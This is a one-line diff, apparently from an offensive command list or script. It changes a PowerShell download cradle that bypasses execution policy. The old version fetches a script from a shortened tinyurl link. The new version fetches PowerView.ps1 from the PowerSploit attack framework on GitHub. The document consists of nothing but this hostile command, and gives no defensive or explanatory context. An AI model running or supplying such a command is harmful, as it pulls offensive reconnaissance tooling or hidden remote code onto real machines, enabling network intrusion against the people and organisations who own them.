@@ -1,1 +1,1 @@
-powershell.exe -exec Bypass -C (New-Object Net.Webclient).downloadstring("https://tinyurl.com/y6bok8fh")
+powershell.exe -exec Bypass -C (New-Object Net.Webclient).downloadstring("https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1")
